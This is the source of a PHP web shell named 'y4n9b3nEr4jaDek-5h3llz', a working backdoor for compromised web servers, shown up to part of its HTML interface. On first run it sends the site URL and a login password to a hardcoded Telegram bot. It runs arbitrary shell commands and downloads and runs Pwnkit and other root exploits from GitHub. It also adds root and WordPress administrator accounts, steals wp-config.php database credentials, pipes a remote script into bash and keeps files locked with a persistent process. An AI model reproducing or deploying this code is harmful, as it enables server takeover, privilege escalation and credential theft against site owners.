<?php

set_time_limit(0);
error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if (function_exists('date_default_timezone_set')) {
    date_default_timezone_set("Asia/Jakarta");
}

session_name('SESS' . substr(hash('sha256', __FILE__), 0, 32));
session_start();


if (!function_exists('hash_equals')) {
    function hash_equals($str1, $str2) {
        if (strlen($str1) != strlen($str2)) { return false; }
        else { $res = $str1 ^ $str2; $ret = 0; for ($i = strlen($res) - 1; $i >= 0; $i--) $ret |= ord($res[$i]); return !$ret; }
    }
}
function get_php_executable() { if (defined('PHP_BINARY') && PHP_BINARY) { return PHP_BINARY; } return 'php'; }
function w($dir, $perm) { return is_writable($dir) ? "<gr>" . $perm . "</gr>" : "<rd>" . $perm . "</rd>"; }
function sz($byt) { if ($byt === false) return '-'; $typ = array('B', 'KB', 'MB', 'GB', 'TB'); for ($i = 0; $byt >= 1024 && $i < (count($typ) - 1); $byt /= 1024, $i++); return (round($byt, 2) . " " . $typ[$i]); }
function ia() { if (getenv('HTTP_CLIENT_IP')) return getenv('HTTP_CLIENT_IP'); if (getenv('HTTP_X_FORWARDED_FOR')) return getenv('HTTP_X_FORWARDED_FOR'); if (getenv('HTTP_X_FORWARDED')) return getenv('HTTP_X_FORWARDED'); if (getenv('HTTP_FORWARDED_FOR')) return getenv('HTTP_FORWARDED_FOR'); if (getenv('HTTP_FORWARDED')) return getenv('HTTP_FORWARDED'); if (getenv('REMOTE_ADDR')) return getenv('REMOTE_ADDR'); return 'Unknown'; }
function get_writable_tmp_dir() { $dirs = array('/dev/shm', '/tmp', sys_get_temp_dir(), getcwd()); foreach ($dirs as $dir) { if (@is_writable($dir)) { return rtrim($dir, '/'); } } return false; }
function process_data_stream($cmd) { $full_cmd = $cmd . ' 2>&1'; if (function_exists('proc_open')) { $d = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $p = @proc_open($full_cmd, $d, $pipes, getcwd()); if (is_resource($p)) { $o = stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p); return $o; } } if (function_exists('shell_exec')) return @shell_exec($full_cmd); if (function_exists('system')) { @ob_start(); @system($full_cmd); $out = @ob_get_contents(); @ob_end_clean(); return $out; } if (function_exists('exec')) { @exec($full_cmd, $results); return implode("\n", $results); } if (function_exists('passthru')) { @ob_start(); @passthru($full_cmd); $out = @ob_get_contents(); @ob_end_clean(); return $out; } return 'Execution function disabled on this server.'; }
function p($file) { $p = @fileperms($file); if (($p & 0xC000) == 0xC000) $i = 's'; elseif (($p & 0xA000) == 0xA000) $i = 'l'; elseif (($p & 0x8000) == 0x8000) $i = '-'; elseif (($p & 0x6000) == 0x6000) $i = 'b'; elseif (($p & 0x4000) == 0x4000) $i = 'd'; elseif (($p & 0x2000) == 0x2000) $i = 'c'; elseif (($p & 0x1000) == 0x1000) $i = 'p'; else $i = 'u'; $i .= (($p & 0x0100) ? 'r' : '-'); $i .= (($p & 0x0080) ? 'w' : '-'); $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-')); $i .= (($p & 0x0020) ? 'r' : '-'); $i .= (($p & 0x0010) ? 'w' : '-'); $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-')); $i .= (($p & 0x0004) ? 'r' : '-'); $i .= (($p & 0x0002) ? 'w' : '-'); $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-')); return $i; }
function send_telegram_notification($url, $password) { $token = "7831803742:AAHa_xIjePROas8WTRptzadsAu07PxONNAQ"; $chat_id = "6196640094"; $message = "url : " . $url . "\npassword : " . $password; $api_url = "https://api.telegram.org/bot" . $token . "/sendMessage"; $data = array('chat_id' => $chat_id, 'text' => $message); $options = array('http' => array('header'  => "Content-type: application/x-www-form-urlencoded\r\n", 'method'  => 'POST', 'content' => http_build_query($data), 'ignore_errors' => true)); $context  = stream_context_create($options); @file_get_contents($api_url, false, $context); }


function get_password_storage_path() {
    $writable_dir = get_writable_tmp_dir();
    if (!$writable_dir) return false;
    $file_identifier = hash('sha256', __FILE__);
    return $writable_dir . '/.auth_' . $file_identifier;
}

function generate_random_string($length = 9) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

function generate_salt($length = 16) {
    if (function_exists('random_bytes')) { return bin2hex(random_bytes($length / 2)); }
    if (function_exists('openssl_random_pseudo_bytes')) { return bin2hex(openssl_random_pseudo_bytes($length / 2)); }
    $salt = ''; for ($i = 0; $i < $length; $i++) { $salt .= sha1(uniqid(mt_rand(), true)); } return substr($salt, 0, $length);
}

$password_file = get_password_storage_path();
$is_first_run = !$password_file || !@file_exists($password_file);

if ($is_first_run) {
    if (!$password_file) die("Fatal Error: No writable temporary directory found. Cannot create password file.");
    $new_password = generate_random_string(9);
    $salt = generate_salt(16);
    $hashed_password = hash('sha256', $salt . $new_password);
    $stored_data = $salt . ':' . $hashed_password;
    if (@file_put_contents($password_file, $stored_data)) {
        $current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
        send_telegram_notification($current_url, $new_password);
        echo <<<HTML
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>One-Time Password Generated</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"><style>body{background-color:#0d1b2a;color:#e0e1dd;}.container{max-width:500px;margin-top:20vh;text-align:center;}.card{background-color:#1b263b;border:1px solid #00f5d4;padding:2rem;border-radius:15px;}.pass-display{background-color:#0d1b2a;padding:1rem;border-radius:.5rem;font-size:1.5rem;font-family:monospace;color:#00f5d4;margin:1rem 0;}.btn-copy{border-color:#00f5d4;color:#00f5d4;}.btn-copy:hover{background-color:#00f5d4;color:#0d1b2a;}</style></head><body><div class="container"><div class="card"><h2><i class="bi bi-key-fill"></i> New Password Generated</h2><p class="text-white-50">This is a one-time operation. Please save this password securely. It is unique to this script's location.</p><div class="input-group"><input type="text" id="pass-field" class="form-control pass-display" value="{$new_password}" readonly><button class="btn btn-outline-light btn-copy" id="copyBtn" onclick="copyPassword()"><i class="bi bi-clipboard"></i> Copy</button></div><div id="copy-alert" class="alert alert-success mt-3 d-none">Password copied to clipboard!</div><a href="{$_SERVER['PHP_SELF']}" class="btn btn-primary mt-3">Continue to Login</a></div></div>
<script>
function copyPassword() {
    const passField = document.getElementById('pass-field'); const alertEl = document.getElementById('copy-alert');
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(passField.value).then(function() {
            alertEl.classList.remove('d-none'); setTimeout(function(){ alertEl.classList.add('d-none'); }, 2000);
        });
    } else {
        passField.select(); passField.setSelectionRange(0, 99999);
        try { document.execCommand('copy'); alertEl.classList.remove('d-none'); setTimeout(function(){ alertEl.classList.add('d-none'); }, 2000); } catch (err) { alert('Failed to copy password. Please copy it manually.'); }
        window.getSelection().removeAllRanges();
    }
}
</script>
</body></html>
HTML;
        exit;
    } else { die("Fatal Error: Failed to write password file to '{$password_file}'. Check permissions."); }
}

function show_login_page() {
    echo <<<HTML
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>{ Login }</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"><style>body{background-color:#0d1b2a;color:#e0e1dd;}.form-control,.btn{border-radius:.25rem;}.form-control:focus{background-color:#1b263b;color:#e0e1dd;border-color:#00f5d4;box-shadow:0 0 0 .25rem rgba(0,245,212,.25);}.btn-outline-light{border-color:#00f5d4;color:#00f5d4;}.btn-outline-light:hover{background-color:#00f5d4;color:#0d1b2a;}.login-container{max-width:400px;margin:15vh auto;padding:2rem;background-color:#1b263b;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.5);}.shell-name{font-family:'Courier New',Courier,monospace;color:#00f5d4;text-align:center;margin-bottom:1.5rem;}</style></head><body><div class="container"><h2 class="shell-name">&lt;w4nnatry_shell /&gt;</h2><form method="POST"><div class="input-group"><span class="input-group-text bg-dark border-secondary"><i class="bi bi-key text-white-50"></i></span><input class="form-control" type="password" placeholder="password" name="p" required><button class="btn btn-outline-light"><i class="bi bi-arrow-return-right"></i></button></div></form></div></body></html>
HTML;
    exit;
}

$request_data = array_merge($_POST, $_GET);
if (isset($request_data["left"])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['is_logged_in'])) {
    if (isset($_POST['p'])) {
        $stored_data = trim(@file_get_contents($password_file));
        $parts = explode(':', $stored_data, 2);
        if (count($parts) === 2) {
            list($salt, $stored_hash) = $parts;
            $submitted_hash = hash('sha256', $salt . $_POST['p']);
            if (hash_equals($stored_hash, $submitted_hash)) {
                $_SESSION['is_logged_in'] = true;
                header("Location: " . $_SERVER['PHP_SELF']);
                exit;
            }
        }
    }
    show_login_page();
}

$path = isset($request_data['path']) ? $request_data['path'] : getcwd();
$real_path = realpath($path);
if ($real_path !== false) {
    $path = $real_path;
}
if (is_dir($path)) {
    $path = rtrim(str_replace('\\', '/', $path), '/') . '/';
}


if (isset($request_data['ajax'])) {
    header('Content-Type: application/json');
    $response = array('status' => 'error', 'message' => 'Invalid action.');
    @chdir($path);
    switch ($request_data['action']) {
        case 'delete_multiple':$files=isset($_POST['files'])?$_POST['files']:array();$s=array();$e=array();foreach($files as $f){$fp=$path.$f;if(is_dir($fp)){if(@rmdir($fp))$s[]=$f;else $e[]=$f;}else{if(@unlink($fp))$s[]=$f;else $e[]=$f;}}$response=array('status'=>'ok','success'=>$s,'errors'=>$e);break;
        case 'get_content':$f=$path.$request_data['file'];if(is_readable($f)){$response=array('status'=>'ok','content'=>file_get_contents($f));}else{$response=array('status'=>'error','message'=>'Cannot read file.');}break;
        case 'save_content':$f=$path.$_POST['file'];if(@file_put_contents($f,$_POST['content'])!==false){$response=array('status'=>'ok','message'=>'File saved successfully.');}else{$response=array('status'=>'error','message'=>'Failed to save file. Check permissions.');}break;
        case 'rename':$o=$path.$_POST['old'];$n=$path.$_POST['new'];if(@rename($o,$n)){$response=array('status'=>'ok','message'=>'Renamed successfully.');}else{$response=array('status'=>'error','message'=>'Rename failed.');}break;
        case 'create_file':$f=$path.$_POST['name'];if(@touch($f)){$response=array('status'=>'ok','message'=>'File created in current directory.');}else{$response=array('status'=>'error','message'=>'Failed to create file.');}break;
        case 'create_folder':$fol=$path.$_POST['name'];if(@mkdir($fol)){$response=array('status'=>'ok','message'=>'Directory created in current directory.');}else{$response=array('status'=>'error','message'=>'Failed to create directory.');}break;
        case 'cmd':$out=process_data_stream($_POST['cmd']);$response=array('status'=>'ok','output'=>htmlspecialchars($out));break;
        case 'root_cmd':function get_pwnkit_path_for_root(){$d=array('/dev/shm','/var/tmp');foreach($d as $dir){if(file_exists($dir.'/pwnkit'))return $dir.'/pwnkit';}return false;}$pp=get_pwnkit_path_for_root();$out=$pp?process_data_stream($pp.' "'. $_POST['cmd'].'"'):'Pwnkit executable not found or not writable.';$response=array('status'=>'ok','output'=>htmlspecialchars($out));break;
        case 'check_pwnkit_status':$d=array('/dev/shm','/var/tmp');$pp=false;foreach($d as $dir){if(file_exists($dir.'/pwnkit')){$pp=$dir.'/pwnkit';break;}}if(!$pp){foreach($d as $dir){if(is_writable($dir)){$pwtw=$dir.'/pwnkit';$url="https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit";if(@file_put_contents($pwtw,@file_get_contents($url))){process_data_stream('chmod +x '.$pwtw);$pp=$pwtw;break;}}}}if($pp&&file_exists($pp)){$res=process_data_stream($pp.' "id"');if(strpos($res,'uid=0(root)')!==false){$response=array('vulnerable'=>true,'message'=>'Root privileges active (Pwnkit found in '.dirname($pp).').');}else{$response=array('vulnerable'=>false,'message'=>'Pwnkit found but failed to get root. Check system compatibility.');}}else{$response=array('vulnerable'=>false,'message'=>'Failed to download pwnkit. No writable directory found in /dev/shm or /var/tmp.');}break;
        case 'backdoor_destroyer':$dr=$_SERVER["DOCUMENT_ROOT"];$cf=basename($_SERVER["PHP_SELF"]);if(is_writable($dr)){$hc=<<<HTACCESS
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
Deny from all
</FilesMatch>
<FilesMatch "^({$cf}|index.php|wp-config.php|wp-includes.php)$">
Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
Allow from all
</FilesMatch>
HTACCESS;
if(@file_put_contents($dr."/.htaccess",$hc)){$response=array('status'=>'ok','message'=>'Backdoor Destroyer activated. .htaccess has been overwritten.');}else{$response=array('status'=>'error','message'=>'Failed to write to .htaccess.');}}else{$response=array('status'=>'error','message'=>'Document root is not writable.');}break;
        case 'lock_item':$ftl=$_POST['file_to_lock'];$ffp=$path.$ftl;$td=get_writable_tmp_dir();if(!$td){$response=array('status'=>'error','message'=>'No writable temporary directory found.');break;}if(!file_exists($ffp)){$response=array('status'=>'error','message'=>'File to lock does not exist.');break;}$sd=$td."/.w4nnatry_sessions";if(!file_exists($sd))@mkdir($sd);$bf=$sd.'/'.base64_encode($ffp.'-text');$hf=$sd.'/'.base64_encode($ffp.'-handler');$pe=get_php_executable();if(@copy($ffp,$bf)){@chmod($ffp,0444);$h_code='<?php @set_time_limit(0);@ignore_user_abort(true);$of="'.$ffp.'";$bf="'.$bf.'";while(true){clearstatcache();if(!file_exists($of)){@copy($bf,$of);@chmod($of,0444);}if(substr(sprintf("%o",@fileperms($of)),-4)!="0444"){@chmod($of,0444);}sleep(1);}';if(@file_put_contents($hf,$h_code)){process_data_stream($pe.' '.$hf.' > /dev/null 2>/dev/null &');$response=array('status'=>'ok','message'=>"Successfully locked ".htmlspecialchars($ftl).". Handler process initiated.");}else{$response=array('status'=>'error','message'=>'Could not create handler file.');}}else{$response=array('status'=>'error','message'=>'Could not create backup of the file.');}break;
        case 'add_root_user':function get_pwnkit_path_for_adduser(){$d=array('/dev/shm','/var/tmp');foreach($d as $dir){if(file_exists($dir.'/pwnkit'))return $dir.'/pwnkit';}return false;}$pp=get_pwnkit_path_for_adduser();if(!$pp){$response=array('status'=>'error','message'=>'Pwnkit not found. Please run the Auto Root check first.');break;}$uac='';if(is_executable('/usr/sbin/useradd')){$uac='/usr/sbin/useradd';}elseif(is_executable('/usr/sbin/adduser')){$uac='/usr/sbin/adduser --quiet --disabled-password --gecos ""';}if(empty($uac)){$response=array('status'=>'error','message'=>'Could not find useradd or adduser command in /usr/sbin.');break;}$un=$_POST['username'];$pw=$_POST['password'];$cu=process_data_stream($pp.' "'.$uac.' '.escapeshellarg($un).'"');$cp=process_data_stream($pp.' "echo -e \''.escapeshellarg($pw)."\\n".escapeshellarg($pw).'\' | passwd '.escapeshellarg($un).'"');$response=['status'=>'ok','output'=>"User Add Command: ".$uac."\n\nUser Add Attempt:\n".htmlspecialchars($cu)."\n\nPassword Set Attempt:\n".htmlspecialchars($cp)];break;
        case 'parse_wp_config':$cp=isset($_POST['config_path'])?$_POST['config_path']:null;$fp=null;if($cp&&file_exists($cp)){$fp=$cp;}else{$sd=rtrim($path,'/');for($i=0;$i<5;$i++){if(file_exists($sd.'/wp-config.php')){$fp=$sd.'/wp-config.php';break;}if($sd==$_SERVER['DOCUMENT_ROOT']||empty($sd))break;$sd=dirname($sd);}}if($fp){$c=file_get_contents($fp);$creds=array();$pats=array('DB_NAME'=>"/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i",'DB_USER'=>"/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i",'DB_PASSWORD'=>"/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i",'DB_HOST'=>"/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i");foreach($pats as $k=>$p){if(preg_match($p,$c,$m)){$creds[strtolower($k)]=$m[1];}}if(!empty($creds)){$response=array('status'=>'ok','creds'=>$creds,'path'=>$fp);}else{$response=array('status'=>'error','message'=>'Found wp-config.php but could not parse credentials.');}}else{$response=array('status'=>'error','message'=>'wp-config.php not found automatically. Please provide the path.');}break;
        case 'add_wp_user':function db_connect($h,$u,$p,$n){if(class_exists('mysqli')){$c=new mysqli($h,$u,$p,$n);if($c->connect_error)return false;return array('conn'=>$c,'type'=>'mysqli');}elseif(function_exists('mysql_connect')){$c=@mysql_connect($h,$u,$p);if(!$c||!@mysql_select_db($n,$c))return false;return array('conn'=>$c,'type'=>'mysql');}return false;}function db_query($db,$q){if($db['type']==='mysqli')return $db['conn']->query($q);else return @mysql_query($q,$db['conn']);}function db_insert_id($db){if($db['type']==='mysqli')return $db['conn']->insert_id;return @mysql_insert_id($db['conn']);}function db_error($db){if($db['type']==='mysqli')return $db['conn']->error;return @mysql_error($db['conn']);}function db_close($db){if($db['type']==='mysqli')$db['conn']->close();else @mysql_close($db['conn']);}function db_escape($db,$s){if($db['type']==='mysqli')return $db['conn']->real_escape_string($s);return @mysql_real_escape_string($s,$db['conn']);}$dh=$_POST['db_host'];$dn=$_POST['db_name'];$du=$_POST['db_user'];$dp=$_POST['db_pass'];$wu=$_POST['wp_user'];$wp=$_POST['wp_pass'];$db=db_connect($dh,$du,$dp,$dn);if(!$db){$response=array('status'=>'error','message'=>'DB Connection Failed or extension not available.');break;}$hp=function_exists('password_hash')?password_hash($wp,PASSWORD_DEFAULT):md5($wp);$out="";$wue=db_escape($db,$wu);$su="INSERT INTO wp_users (user_login,user_pass,user_nicename,user_email,user_registered,display_name) VALUES ('{$wue}','{$hp}','{$wue}','',NOW(),'{$wue}')";if(db_query($db,$su)){$uid=db_insert_id($db);$out.="User '$wu' created with ID: $uid.\n";$sm="INSERT INTO wp_usermeta (user_id,meta_key,meta_value) VALUES ({$uid},'wp_capabilities','a:1:{s:13:\"administrator\";b:1;}')";if(db_query($db,$sm)){$out.="User capabilities set to Administrator.";$response=array('status'=>'ok','output'=>$out);}else{$out.="Failed to set user meta: ".db_error($db);$response=array('status'=>'error','message'=>$out);}}else{$out.="Failed to create user: ".db_error($db);$response=array('status'=>'error','message'=>$out);}db_close($db);break;
        case 'scan_root':
            $rooting_dir = $path."/rooting/";
            $auto_tar_gz = $rooting_dir."auto.tar.gz";
            $netfilter_path = $rooting_dir."netfilter";

            if (!file_exists($rooting_dir)) {
                if (!@mkdir($rooting_dir)) {
                    $response = array('status' => 'error', 'message' => 'Failed to create rooting directory: ' . htmlspecialchars($rooting_dir));
                    break;
                }
            }

            if (!file_exists($netfilter_path)) {
                $download_url = "https://raw.githubusercontent.com/hekerprotzy/rootshell/main/auto.tar.gz";
                $download_content = @file_get_contents($download_url);
                $download_success = ($download_content !== false && @file_put_contents($auto_tar_gz, $download_content) !== false);

                if (!$download_success) {
                    $response = array('status' => 'error', 'message' => 'Failed to download ' . htmlspecialchars(basename($download_url)) . '. Check internet access or URL.');
                    break;
                }

                $extract_output = process_data_stream("tar -xf " . escapeshellarg($auto_tar_gz) . " -C " . escapeshellarg($rooting_dir) . " && chmod +x " . escapeshellarg($rooting_dir) . "*");
                if (!file_exists($netfilter_path)) {
                    $response = array('status' => 'error', 'message' => 'Failed to extract or set permissions for root binaries. Tar output: ' . htmlspecialchars($extract_output));
                    @unlink($auto_tar_gz);
                    @rmdir($rooting_dir);
                    break;
                }
                @unlink($auto_tar_gz);
            }


            $output = '';
            $output .= 'Netfilter : '.process_data_stream("timeout 10 " . escapeshellarg($netfilter_path))."\n";
            $output .= 'Ptrace : '.process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir."ptrace"))."\n";
            $output .= 'Sequoia : '.process_data_stream("timeout 10 " . escapeshellarg($rooting_dir."sequoia"))."\n";
            $output .= 'OverlayFS : '.process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir."overlayfs"))."\n";
            $output .= 'Dirtypipe : '.process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir."dirtypipe /usr/bin/su"))."\n";
            $output .= 'Sudo : '.process_data_stream("echo '12345' | timeout 10 sudoedit -s Y")."\n";
            $output .= 'Pwnkit : '.process_data_stream("echo id | timeout 10 " . escapeshellarg($rooting_dir."pwnkit"))."\n";

            process_data_stream("rm -rf " . escapeshellarg($rooting_dir));
            $response = array('status' => 'ok', 'output' => htmlspecialchars($output));
            break;
        case 'scan_suid':
            $output = process_data_stream("find / -perm -u=s -type f 2>>/dev/null");
            $response = array('status' => 'ok', 'output' => htmlspecialchars($output));
            break;
        case 'exploit_suggester':
            $output = process_data_stream("curl -Lsk " . escapeshellarg("http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh") . " | bash");
            $response = array('status' => 'ok', 'output' => htmlspecialchars($output));
            break;
    }
    echo json_encode($response);
    exit;
}

if(isset($_FILES['files'])){$u=array();$f=array();foreach($_FILES['files']['name']as $i=>$n){if(move_uploaded_file($_FILES['files']['tmp_name'][$i],$path.$n)){$u[]=$n;}else{$f[]=$n;}}$_SESSION['flash_message']="Uploaded: ".implode(', ',$u).". Failed: ".implode(', ',$f);header("Location: ".$_SERVER['REQUEST_URI']);exit;}
if(isset($request_data['id'])&&$request_data['id']=='phpinfo'){ob_start();eval("phpinfo();");$b=ob_get_clean();$s=strpos($b,"<body>")+6;$e=strpos($b,"</body>");echo"<style>body{background-color:#fff;color:#333}pre{background-color:#f4f4f4;padding:1rem;border:1px solid #ddd;}</style><pre>".substr($b,$s,$e-$s)."</pre>";exit;}
if(isset($request_data['action'])&&$request_data['action']=='download'&&isset($request_data['file'])){ob_clean();$f=$path.$request_data['file'];if(file_exists($f)&&is_readable($f)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($f).'"');header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.filesize($f));readfile($f);}else{echo "File not found or not readable.";}exit;}
$sql=(function_exists('mysql_connect')||class_exists('mysqli'))?"<gr>ON</gr>":"<rd>OFF</rd>";$curl=(function_exists('curl_version'))?"<gr>ON</gr>":"<rd>OFF</rd>";$wget=(process_data_stream('wget --help'))?"<gr>ON</gr>":"<rd>OFF</rd>";$pl=(process_data_stream('perl --help'))?"<gr>ON</gr>":"<rd>OFF</rd>";$py=(process_data_stream('python --help'))?"<gr>ON</gr>":"<rd>OFF</rd>";$disfunc=@ini_get("disable_functions");if(empty($disfunc)){$disfc="<gr>NONE</gr>";}else{$disfc="<rd>$disfunc</rd>";}if(!function_exists('posix_getegid')){$user=@get_current_user();$uid=@getmyuid();$gid=@getmygid();$group="?";}else{$uid_info=@posix_getpwuid(posix_geteuid());$gid_info=@posix_getgrgid(posix_getegid());$user=isset($uid_info['name'])?$uid_info['name']:'?';$uid=isset($uid_info['uid'])?$uid_info['uid']:'?';$group=isset($gid_info['name'])?$gid_info['name']:'?';$gid=isset($gid_info['gid'])?$gid_info['gid']:'?';}$sm=(@ini_get(strtolower("safe_mode"))=='on'||@ini_get(strtolower("safe_mode"))===1)?"<rd>ON</rd>":"<gr>OFF</gr>";$scandir=@scandir($path);$dirs=array();$files=array();if($scandir){foreach($scandir as $item){if($item==='.'||$item==='..')continue;if(is_dir($path.$item)){$dirs[]=$item;}else{$files[]=$item;}}}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>y4n9b3nEr4jaDek-5h3llz v3.5 // Final Build</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" rel="stylesheet" />
    <style>:root{--bs-dark-rgb:13,27,42;--bs-secondary-rgb:27,38,59;--bs-body-bg:#0d1b2a;--bs-body-color:#e0e1dd;--primary-accent:#00f5d4;--primary-accent-rgb:0,245,212;--secondary-accent:#00b4d8;--danger-color:#f94144;--success-color:#90be6d;--link-color:var(--primary-accent);--link-hover-color:#fff}body{font-family:'Roboto Mono',monospace}a{color:var(--link-color);text-decoration:none}a:hover{color:var(--link-hover-color)}gr{color:var(--success-color)}rd{color:var(--danger-color)}.table{--bs-table-bg:#1b263b;--bs-table-border-color:#404a69;--bs-table-hover-bg:#223344}.table td,.table th{white-space:nowrap}.btn-main{background-color:transparent;border:1px solid var(--primary-accent);color:var(--primary-accent);transition:all .2s ease-in-out}.btn-main:hover{background-color:var(--primary-accent);color:var(--bs-body-bg);box-shadow:0 0 15px rgba(var(--primary-accent-rgb),.5)}.modal-content{background-color:#1b263b;border:1px solid var(--primary-accent)}.form-control,.form-select{background-color:#0d1b2a;color:#fff;border-color:#404a69}.form-control:focus{border-color:var(--primary-accent);box-shadow:0 0 0 .25rem rgba(var(--primary-accent-rgb),.25)}.path-bar a,.path-bar span{color:#8e9aaf}.path-bar a:hover{color:#fff}.banner{padding:1rem 1.5rem;background:linear-gradient(135deg,rgba(27,38,59,.8),rgba(13,27,42,.9));border-radius:8px;margin-bottom:1.5rem;border:1px solid #404a69}.banner-title{font-size:2rem;color:#fff;font-weight:700;text-shadow:0 0 10px var(--primary-accent)}.banner-text{color:var(--primary-accent)}#toast-container{position:fixed;top:1rem;right:1rem;z-index:9999}.toast{width:350px;max-width:100%}.output-console{background:#000;color:#eee;font-family:'Roboto Mono',monospace;font-size:.85em;max-height:400px;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word;border-radius:5px;padding:1rem}</style>
</head>
<body>
<div class="container-fluid py-3">
    <div class="banner"><div class="d-flex justify-content-between align-items-center"><div><h1 class="banner-title">y4n9b3nEr4jaDek-5h3llz <span class="banner-text">v3.5</span></h1><small class="text-white-50">made with love // #CianjurHacktivist</small></div><a href="?left" class="btn btn-sm btn-outline-danger"><i class="bi bi-box-arrow-in-left"></i> Logout</a></div></div>
    <div class="card bg-secondary mb-3"><div class="card-body p-2"><small><i class="bi bi-hdd-fill"></i> Uname: <gr><?php echo php_uname(); ?></gr><br><i class="bi bi-motherboard-fill"></i> Software: <gr><?php echo $_SERVER['SERVER_SOFTWARE']; ?></gr><br><i class="bi bi-cpu-fill"></i> User: <gr><?php echo "$user ($uid)"; ?></gr> | Group: <gr><?php echo "$group ($gid)"; ?></gr> | Safe Mode: <?php echo $sm; ?><br><i class="bi bi-plugin"></i> PHP: <gr><?php echo PHP_VERSION; ?></gr> <a href="?id=phpinfo" target="_blank">[PHPINFO]</a> | Tools: MySQL: <?php echo $sql; ?> | cURL: <?php echo $curl; ?> | WGET: <?php echo $wget; ?> | Perl: <?php echo $pl; ?> | Python: <?php echo $py; ?><br><i class="bi bi-shield-slash-fill"></i> Disable Functions: <?php echo $disfc; ?></small></div></div>
    <div class="card bg-secondary p-2 mb-3">
        <div class="d-flex flex-wrap justify-content-between align-items-center">
            <div class="path-bar text-break mb-2 mb-md-0"><i class="bi bi-folder2-open"></i><?php $path_parts=explode('/',rtrim($path,'/'));if(count($path_parts)==1&&$path_parts[0]==''){echo "<a href='?path=/'>/</a>";}else{$build_path='';foreach($path_parts as $id=>$pat){if($id==0&&empty($pat)){$build_path='/';echo "<a href='?path=/'>/</a>";continue;}$build_path.=$pat.'/';echo "<span>/</span><a href='?path=".urlencode($build_path)."'>$pat</a>";}}?>&nbsp;[ <?php echo w(rtrim($path, '/'), p(rtrim($path, '/'))); ?> ]</div>
            <div class="btn-toolbar">
                <div class="btn-group me-2 mb-2 mb-md-0" role="group"><button id="btnUpload" class="btn btn-sm btn-main"><i class="bi bi-upload"></i> Upload</button><button id="btnNewFile" class="btn btn-sm btn-main"><i class="bi bi-file-earmark-plus"></i> New File</button><button id="btnNewFolder" class="btn btn-sm btn-main"><i class="bi bi-folder-plus"></i> New Folder</button></div>
                <div class="btn-group me-2 mb-2 mb-md-0" role="group"><button id="btnNetwork" class="btn btn-sm btn-main"><i class="bi bi-hdd-network"></i> Network</button><button id="btnInjector" class="btn btn-sm btn-main"><i class="bi bi-bug-fill"></i> Injector</button><button id="btnMassTools" class="btn btn-sm btn-main"><i class="bi bi-exclamation-diamond"></i> Mass Tools</button></div>
                <div class="btn-group mb-2 mb-md-0" role="group"><button id="btnRootConsole" class="btn btn-sm btn-main"><i class="bi bi-terminal-plus"></i> Root Console</button><button id="btnUsers" class="btn btn-sm btn-main"><i class="bi bi-people-fill"></i> Users</button><button id="btnSecurity" class="btn btn-sm btn-main"><i class="bi bi-shield-lock"></i> Security</button><button id="btnScanRoot" class="btn btn-sm btn-main"><i class="bi bi-bug"></i> Root/SUID Scan</button></div>
            </div>
        </div>
    </div>
